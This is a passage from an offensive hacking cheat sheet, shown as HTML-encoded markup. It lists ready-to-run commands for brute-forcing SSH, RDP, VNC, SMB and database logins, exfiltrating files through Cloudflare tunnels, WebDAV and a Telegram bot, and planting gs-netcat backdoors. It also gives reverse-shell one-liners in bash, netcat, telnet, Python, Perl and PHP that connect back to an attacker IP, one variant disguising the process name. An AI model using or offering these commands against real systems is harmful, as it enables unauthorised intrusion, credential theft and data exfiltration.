&lt;strong&gt;Nmap&lt;/strong&gt; parameters:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;--script-args userdb=&#34;${ULIST}&#34;,passdb=&#34;${PLIST}&#34;,brute.firstOnly&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Useful &lt;strong&gt;Ncrack&lt;/strong&gt; parameters:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;-U &#34;${ULIST}&#34;&#xA;-P &#34;${PLIST}&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Useful &lt;strong&gt;Hydra&lt;/strong&gt; parameters:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;-t4      # Limit to 4 tasks&#xA;-l root  # Set username&#xA;-V       # Show each login/password attempt&#xA;-s 31337 # Set port&#xA;-S       # Use SSL&#xA;-f       # Exit after first valid login&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;!--&#xA;```shell&#xA;## HTTP Login&#xA;hydra -l admin -P &#34;${PLIST}&#34; http-post-fomr &#34;/admin.php:u=^USER&amp;p-^PASS&amp;f=login:&#39;Enter&#39;&#34; -v&#xA;```&#xA;--&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## SSH&#xA;nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s &#34;$T&#34;&#xA;ncrack -P &#34;${PLIST}&#34; --user root &#34;ssh://${T}&#34;&#xA;hydra -P &#34;${PLIST}&#34; -l root &#34;ssh://$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## Remote Desktop Protocol / RDP&#xA;ncrack -P &#34;${PLIST}&#34; --user root -p3389 &#34;${T}&#34;&#xA;hydra -P &#34;${PLIST}&#34; -l root &#34;rdp://$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## FTP&#xA;hydra -P &#34;${PLIST}&#34; -l user &#34;ftp://$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## IMAP (email)&#xA;nmap -p 143,993 --script imap-brute &#34;$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## POP3 (email)&#xA;nmap -p110,995 --script pop3-brute &#34;$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## MySQL&#xA;nmap -p3306 --script mysql-brute &#34;$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## PostgreSQL&#xA;nmap -p5432 --script pgsql-brute &#34;$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## SMB (windows)&#xA;nmap --script smb-brute &#34;$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## Telnet&#xA;nmap -p23 --script telnet-brute --script-args telnet-brute.timeout=8s &#34;$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## VNC&#xA;nmap -p5900 --script vnc-brute &#34;$T&#34;&#xA;ncrack -P &#34;${PLIST}&#34; --user root &#34;vnc://$T&#34;&#xA;hydra -P &#34;${PLIST}&#34; &#34;vnc://$T&#34;&#xA;medusa -P &#34;${PLIST}&#34; –u root –M vnc -h &#34;$T&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## VNC (with metasploit)&#xA;msfconsole&#xA;use auxiliary/scanner/vnc/vnc_login&#xA;set rhosts 192.168.0.1&#xA;set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt&#xA;run&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;## HTML basic auth&#xA;echo admin &amp;gt;user.txt                     # Try only 1 username&#xA;echo -e &#34;blah\naaddd\nfoobar&#34; &amp;gt;pass.txt  # Add some passwords to try. &#39;aaddd&#39; is the valid one.&#xA;nmap -p80 --script http-brute --script-args \&#xA;   http-brute.hostname=pentesteracademylab.appspot.com,http-brute.path=/lab/webapp/basicauth,userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \&#xA;   pentesteracademylab.appspot.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;exfil&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;4. Data Upload/Download/Exfil&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;file-encoding&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;4.i File Encoding&lt;/h3&gt; &#xA;&lt;p&gt;Encode binaries to text for transport via a terminal connection:&lt;/p&gt; &#xA;&lt;h4&gt;UU encode/decode&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## uuencode &#xA;uuencode /etc/issue.net issue.net-COPY&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Output - CLICK HERE&lt;/summary&gt; &#xA; &lt;blockquote&gt; &#xA;  &lt;p&gt;begin 644 issue.net-COPY&lt;br&gt; 72V%L:2!&#39;3E4O3&amp;amp;EN=7@@4F]L;&amp;amp;EN9PH`&lt;br&gt; `&lt;br&gt; end&lt;/p&gt; &#xA; &lt;/blockquote&gt; &#xA;&lt;/details&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## uudecode (cut &amp;amp; paste the 3 lines from above):&#xA;uudecode&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Openssl encode/decode&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## openssl encode&#xA;openssl base64 &amp;lt;/etc/issue.net&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Output - CLICK HERE&lt;/summary&gt; &#xA; &lt;blockquote&gt; &#xA;  &lt;p&gt;VWJ1bnR1IDE4LjA0LjIgTFRTCg==&lt;/p&gt; &#xA; &lt;/blockquote&gt; &#xA;&lt;/details&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## openssl decode (cut &amp;amp; paste the 1 line from above):&#xA;openssl base64 -d &amp;gt;issue.net-COPY&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;xxd encode/decode&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## xxd encode&#xA;xxd -p &amp;lt;/etc/issue.net&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Output - CLICK HERE&lt;/summary&gt; &#xA; &lt;blockquote&gt; &#xA;  &lt;p&gt;4b616c6920474e552f4c696e757820526f6c6c696e670a&lt;/p&gt; &#xA; &lt;/blockquote&gt; &#xA;&lt;/details&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## xxd decode&#xA;xxd -p -r &amp;gt;issue.net-COPY&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;cut-paste&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;4.ii. File transfer - using cut &amp;amp; paste&lt;/h3&gt; &#xA;&lt;p&gt;Paste into a file on the remote machine (note the &lt;code&gt;&amp;lt;&amp;lt;-&#39;__EOF__&#39;&lt;/code&gt; to not mess with tabs or $-variables).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cat &amp;gt;output.txt &amp;lt;&amp;lt;-&#39;__EOF__&#39;&#xA;[...]&#xA;__EOF__  ### Finish your cut &amp;amp; paste by typing __EOF__&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;file-transfer-screen&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;4.iii. File transfer - using &lt;em&gt;screen&lt;/em&gt;&lt;/h3&gt; &#xA;&lt;h4&gt;From REMOTE to LOCAL (download)&lt;/h4&gt; &#xA;&lt;p&gt;Have a &lt;em&gt;screen&lt;/em&gt; running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output to screen-xfer.txt:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;CTRL-a : logfile screen-xfer.txt&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;CTRL-a H&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;We use &lt;em&gt;openssl&lt;/em&gt; to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and &lt;em&gt;screen&lt;/em&gt; will write this data to &lt;em&gt;screen-xfer.txt&lt;/em&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## On the remote system encode issue.net&#xA;openssl base64 &amp;lt;/etc/issue.net&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Stop your local screen from logging any further data:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;CTRL-a H&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;On your local computer decode the file:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;openssl base64 -d &amp;lt;screen-xfer.txt&#xA;rm -rf screen-xfer.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;From LOCAL to REMOTE (upload)&lt;/h4&gt; &#xA;&lt;p&gt;On your local system encode the data:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;openssl base64 &amp;lt;/etc/issue.net &amp;gt;screen-xfer.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the remote system (and from within the current &lt;em&gt;screen&lt;/em&gt;):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;openssl base64 -d&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get &lt;em&gt;screen&lt;/em&gt; to slurp the base64 encoded data into screen&#39;s clipboard and paste the data from the clipboard to the remote system:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;CTRL-a : readbuf screen-xfer.txt&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;CTRL-a : paste .&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;CTRL-d&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;CTRL-d&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Note: Two CTRL-d are required due to a &lt;a href=&#34;https://github.com/openssl/openssl/issues/9355&#34;&gt;bug in openssl&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;file-transfer-gs-netcat&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;4.iv. File transfer - using gs-netcat and sftp&lt;/h3&gt; &#xA;&lt;p&gt;Use &lt;a href=&#34;https://github.com/hackerschoice/gsocket&#34;&gt;gs-netcat&lt;/a&gt; and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host behind NAT/Firewall&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;From your workstation execute this command to connect to the SFTP server:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;export GSOCKET_ARGS=&#34;-s MySecret&#34;                        # Workstation&#xA;sftp -D gs-netcat                                        # Workstation&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;http&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;4.v. File transfer - using HTTP&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## Spawn a temporary HTTP server and share the current working directory.&#xA;python -m http.server 8080&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## Request a temporary tunnel on a public domain&#xA;cloudflared tunnel -url localhost:8080&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;burl&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;4.vi. File transfer without curl&lt;/h3&gt; &#xA;&lt;p&gt;Using bash, download only:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;burl() {&#xA;    IFS=/ read -r proto x host query &amp;lt;&amp;lt;&amp;lt;&#34;$1&#34;&#xA;    exec 3&amp;lt;&amp;gt;&#34;/dev/tcp/${host}/${PORT:-80}&#34;&#xA;    echo -en &#34;GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n&#34; &amp;gt;&amp;amp;3&#xA;    (while read -r l; do echo &amp;gt;&amp;amp;2 &#34;$l&#34;; [[ $l == $&#39;\r&#39; ]] &amp;amp;&amp;amp; break; done &amp;amp;&amp;amp; cat ) &amp;lt;&amp;amp;3&#xA;    exec 3&amp;gt;&amp;amp;-&#xA;}&#xA;# burl http://ipinfo.io&#xA;# PORT=31337 burl http://37.120.235.188/blah.tar.gz &amp;gt;blah.tar.gz&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;webdav&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;4.vii. File transfer - using WebDAV&lt;/h3&gt; &#xA;&lt;p&gt;On your workstation (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cloudflared tunnel --url localhost:8080 &amp;amp;&#xA;# [...]&#xA;# +--------------------------------------------------------------------------------------------+&#xA;# |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |&#xA;# |  https://example-foo-bar-lights.trycloudflare.com                                          |&#xA;# +--------------------------------------------------------------------------------------------+&#xA;# [...]&#xA;wsgidav --port=8080 --root=.  --auth=anonymous&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On another server:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Upload a file to your workstation&#xA;curl -T file.dat https://example-foo-bar-lights.trycloudflare.com&#xA;# Create a directory remotely&#xA;curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources&#xA;# Create a directory hirachy remotely&#xA;find . -type d | xargs -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}&#xA;# Upload all *.c files (in parallel):&#xA;find . -name &#39;*.c&#39; | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Access the share from Windows (to drag &amp;amp; drop files) in File Explorer:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;\\example-foo-bar-lights.trycloudflare.com@SSL\sources&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or mount the WebDAV share on Windows (Z:/):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;tg&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;4.viii. File transfer to Telegram&lt;/h3&gt; &#xA;&lt;p&gt;There are &lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#cloudexfil&#34;&gt;zillions of upload services&lt;/a&gt; but TG is a neat alternative. Get a &lt;em&gt;TG-Bot-Token&lt;/em&gt; from the &lt;a href=&#34;https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token&#34;&gt;TG BotFather&lt;/a&gt;. Then create a new TG group and add your bot to the group. Retrieve the &lt;em&gt;chat_id&lt;/em&gt; of that group:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl -s &#34;https://api.telegram.org/bot&amp;lt;TG-BOT-TOKEN&amp;gt;/getUpdates&#34; | jq -r &#39;.result[].message.chat.id&#39; | uniq&#xA;# If you get only {&#34;ok&#34;:true,&#34;result&#34;:[]} then remove and add the bot again.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Upload file.zip straight into the group chat:&#xA;curl -sF document=@file.zip &#34;https://api.telegram.org/bot&amp;lt;TG-BOT-TOKEN&amp;gt;/sendDocument?chat_id=&amp;lt;TG-CHAT-ID&amp;gt;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;5. Reverse Shell / Dumb Shell&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell-gs-netcat&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.i.a. Reverse shell with gs-netcat&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Use &lt;a href=&#34;https://gsocket.io/deploy&#34;&gt;gsocket deploy&lt;/a&gt;. It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses &#39;password hashes&#39; instead of IP addresses to connect. This means that you do not need to run your own Command &amp;amp; Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :&amp;gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gs-netcat -s MySecret -l -i    # Host&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use -D to start the reverse shell in the background (daemon) and with a watchdog to auto-restart if killed.&lt;/p&gt; &#xA;&lt;p&gt;To connect to the shell from your workstation:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gs-netcat -s MySecret -i&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use -T to tunnel trough TOR.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell-bash&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.i.b. Reverse shell with Bash&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Start netcat to listen on port 1524 on your system:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;nc -nvlp 1524&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# If the current shell is Bash already:&#xA;(bash -i &amp;amp;&amp;gt;/dev/tcp/3.13.3.7/1524 0&amp;gt;&amp;amp;1) &amp;amp;&#xA;# If the current shell is NOT Bash then we need:&#xA;bash -c &#39;(exec bash -i &amp;amp;&amp;gt;/dev/tcp/3.13.3.7/1524 0&amp;gt;&amp;amp;1) &amp;amp;&#39;&#xA;# or hide the bash process as &#39;kqueue&#39;&#xA;bash -c &#39;(exec -a kqueue bash -i &amp;amp;&amp;gt;/dev/tcp/3.13.3.7/1524 0&amp;gt;&amp;amp;1) &amp;amp;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell-no-bash&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.i.c. Reverse shell without Bash&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Embedded systems do not always have Bash and the &lt;em&gt;/dev/tcp/&lt;/em&gt; trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:&lt;/p&gt; &#xA;&lt;p&gt;On the remote system:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;nc -e /bin/bash -vn 3.13.3.7 1524&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Variant if &lt;em&gt;&#39;-e&#39;&lt;/em&gt; is not supported:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;mkfifo /tmp/.io&#xA;sh -i 2&amp;gt;&amp;amp;1 &amp;lt;/tmp/.io | nc -vn 3.13.3.7 1524 &amp;gt;/tmp/.io&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Telnet variant:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;mkfifo /tmp/.io&#xA;sh -i 2&amp;gt;&amp;amp;1 &amp;lt;/tmp/.io | telnet 3.13.3.7 1524 &amp;gt;/tmp/.io&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Telnet variant when mkfifo is not supported (Ulg!):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;(touch /dev/shm/.fio; sleep 60; rm -f /dev/shm/.fio) &amp;amp;&#xA;tail -f /dev/shm/.fio | sh -i 2&amp;gt;&amp;amp;1 | telnet 3.13.3.7 1524 &amp;gt;/dev/shm/.fio&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: Use &lt;em&gt;/tmp/.fio&lt;/em&gt; if &lt;em&gt;/dev/shm&lt;/em&gt; is not available. Note: This trick logs your commands to a file. The file will be &lt;em&gt;unlinked&lt;/em&gt; from the fs after 60 seconds but remains useable as a &#39;make shift pipe&#39; as long as the reverse tunnel is started within 60 seconds.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;revese-shell-remote-moe&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.i.d. Reverse shell with remote.moe and ssh&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;It is possible to tunnel raw TCP (e.g bash reverse shell) through &lt;a href=&#34;https://remote.moe&#34;&gt;remote.moe&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;p&gt;On your workstation:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# First Terminal - Create a remote.moe tunnel to your workstation&#xA;ssh-keygen -q -t rsa -N &#34;&#34; -f .r  # New key creates a new remote.moe-address&#xA;ssh -i .r -R31337:0:8080 -o StrictHostKeyChecking=no nokey@remote.moe; rm -f .r&#xA;# Note down the &#39;remote.moe&#39; address which will look something like&#xA;# uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe&#xA;&#xA;# Second Terminal - start listening for the reverse shell&#xA;nc -vnlp 8080&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the target(needs SSH and Bash):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;bash -c &#39;(killall ssh; rm -f /tmp/.r; ssh-keygen -q -t rsa -N &#34;&#34; -f /tmp/.r; ssh -i /tmp/.r -o StrictHostKeyChecking=no -L31338:uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 -Nf remote.moe;  bash -i &amp;amp;&amp;gt;/dev/tcp/0/31338 0&amp;gt;&amp;amp;1 &amp;amp;)&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the target (alternative; needs ssh, bash and mkfifo):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N &#34;&#34; -f /tmp/.r &amp;amp;&amp;amp; mkfifo /tmp/.p &amp;amp;&amp;amp; (bash -i&amp;lt;/tmp/.p  2&amp;gt;1 |ssh -i /tmp/.r -o StrictHostKeyChecking=no -W uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 remote.moe&amp;gt;/tmp/.p &amp;amp;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell-python&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.i.e. Reverse shell with Python&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;3.13.3.7&#34;,1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell-perl&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.i.f. Reverse shell with Perl&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# method 1&#xA;perl -e &#39;use Socket;$i=&#34;3.13.3.7&#34;;$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&amp;gt;&amp;amp;S&#34;);open(STDOUT,&#34;&amp;gt;&amp;amp;S&#34;);open(STDERR,&#34;&amp;gt;&amp;amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;&#xA;# method 2&#xA;perl -MIO -e &#39;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,&#34;3.13.3.7:1524&#34;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);while(&amp;lt;&amp;gt;){if($_=~ /(.*)/){system $1;}};&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell-php&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.i.g. Reverse shell with PHP&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;php -r &#39;$sock=fsockopen(&#34;3.13.3.7&#34;,1524);exec(&#34;/bin/bash -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&#34;);&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell-upgrade&#34;&gt;&lt;/a&gt; &lt;a id=&#34;reverse-shell-pty&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.ii.a. Upgrade a reverse shell to a PTY shell&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Any of the above reverse shells are limited. For example &lt;em&gt;sudo bash&lt;/em&gt; or &lt;em&gt;top&lt;/em&gt; will not work. To make these work we have to upgrade the shell to a real PTY shell:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Using script&#xA;exec script -qc /bin/bash /dev/null  # Linux&#xA;exec script -q /dev/null /bin/bash   # BSD&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Using python&#xA;exec python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell-interactive&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.ii.b. Upgrade a reverse shell to a fully interactive shell&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# On the target host spwan a PTY using any of the above examples:&#xA;python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;&#xA;# Now Press Ctrl-Z to suspend the connection and return to your own terminal.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;# On your terminal execute:&#xA;stty raw -echo opost; fg&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;# On target host&#xA;export SHELL=/bin/bash&#xA;export TERM=xterm-256color&#xA;reset&#xA;stty rows 24 columns 120&#xA;# Pimp up your prompt&#xA;PS1=&#39;{THC} USERS=$(who | wc -l) LOAD=$(cut 